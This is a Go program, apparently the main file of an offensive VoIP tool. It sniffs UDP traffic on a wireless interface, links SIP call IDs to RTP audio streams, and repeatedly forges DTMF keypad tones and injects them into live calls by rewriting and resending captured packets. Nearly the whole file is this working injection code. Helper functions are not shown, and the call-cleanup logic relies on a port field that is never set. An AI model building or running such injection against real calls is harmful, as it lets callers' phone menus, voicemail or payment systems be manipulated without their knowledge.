package main

import (
	"flag"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/jart/gosip/sip"
)

var (
	iface             = flag.String("i", "wlan0", "Interface to listen on")
	dst               = flag.String("d", "", "Destination IP to filter by")
	injectionInterval = flag.Duration("t", 3*time.Second, "Time between injection attempts")
	sequence          = flag.Uint("s", 10, "Injection sequence offset (begin injecting packets at this sequence number)")
)

var (
	streams = map[uint32]*rtpStream{} // SSRC -> rtpStream
	calls   = map[string]uint16{}     // Call-ID -> local port
)

// between gets the string between two substrings
func between(s, start, end string) string {
	sp := strings.Split(s, start)
	if len(sp) < 2 {
		return ""
	}
	return strings.Split(sp[1], end)[0]
}

func modifyAndInject(handle *pcap.Handle, pkt gopacket.Packet, payload []byte) error {
	*pkt.ApplicationLayer().(*gopacket.Payload) = payload
	if err := pkt.TransportLayer().(*layers.UDP).SetNetworkLayerForChecksum(pkt.NetworkLayer()); err != nil {
		return err
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializePacket(buffer, options, pkt); err != nil {
		return err
	}

	return handle.WritePacketData(buffer.Bytes())
}

func main() {
	flag.Parse()

	log.Printf("Filtering by destination IP %s with injection sequence offset %d", *dst, *sequence)

	handle, err := pcap.OpenLive(*iface, 262144, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("udp and dst " + *dst); err != nil {
		log.Fatal(err)
	}

	log.Printf("Starting capture on %s", *iface)
	for pkt := range gopacket.NewPacketSource(handle, handle.LinkType()).Packets() {
		// Decode UDP packet
		udp := pkt.Layer(layers.LayerTypeUDP)
		if udp == nil {
			continue
		}
		udpLayer := udp.(*layers.UDP)

		// Attempt to decode RTP packet
		var rtph rtpHeader
		if err := rtph.read(udpLayer.Payload); err == nil {
			// Find SIP call ID by RTP port
			call := "[unknown]"
			for callID, rtpPort := range calls {
				if strconv.Itoa(int(rtpPort)) == udpLayer.SrcPort.String() {
					call = callID
					break
				}
			}

			// Check if stream seen
			if _, ok := streams[rtph.SSRC]; !ok {
				log.Printf("[RTP] Tracking stream (ssrc %d seq %d) to call %s", rtph.SSRC, rtph.Seq, call)
				streams[rtph.SSRC] = &rtpStream{
					FirstSeen: time.Now(),
				}
			}

			// Check if it has been at least N seconds since last packet injection
			stream := streams[rtph.SSRC]
			if rtph.Seq >= uint16(*sequence) &&
				(stream.LastInjected.IsZero() ||
					time.Since(stream.LastInjected) > *injectionInterval) {

				log.Printf(
					"[RTP] Injecting DTMF tone [%s:%d -> %s:%d] SSRC %d call %s",
					pkt.NetworkLayer().NetworkFlow().Src(), udpLayer.SrcPort,
					pkt.NetworkLayer().NetworkFlow().Dst(), udpLayer.DstPort,
					rtph.SSRC,
					call,
				)

				// Send DTMF tone
				if err := sendDTMF(rtph.Seq+1, rtph.TS, rtph.SSRC, func(b []byte) error {
					return modifyAndInject(handle, pkt, b)
				}); err != nil {
					log.Fatal(err)
				}
				stream.LastInjected = time.Now()
			}
		}

		// Attempt to decode SIP packet
		msg, err := sip.ParseMsg(udpLayer.Payload)
		if err == nil {
			if msg.Payload != nil {
				// Parse RTP local port from SIP message payload
				rtpLocalPort, err := strconv.Atoi(between(string(msg.Payload.Data()), "m=audio ", " RTP/AVP"))
				if err == nil {
					// Register call if we haven't seen it before
					if _, ok := calls[msg.CallID]; !ok {
						log.Printf("[SIP] Tracking call from %s [Call ID %s] RTP local port %d", msg.From, msg.CallID, rtpLocalPort)
						calls[msg.CallID] = uint16(rtpLocalPort)
					}
				}
			} else {
				// Cleanup when call is over
				if msg.Phrase == "Ok" {
					log.Printf("[SIP] Call ended (%s)", msg.CallID)

					// Delete call's RTP stream
					localPort := calls[msg.CallID]
					for ssrc, stream := range streams {
						if stream.localPort == localPort {
							delete(streams, ssrc)
							break
						}
					}

					// Cleanup call to RTP stream mapping
					delete(calls, msg.CallID)
				}
			}
		}
	}
}
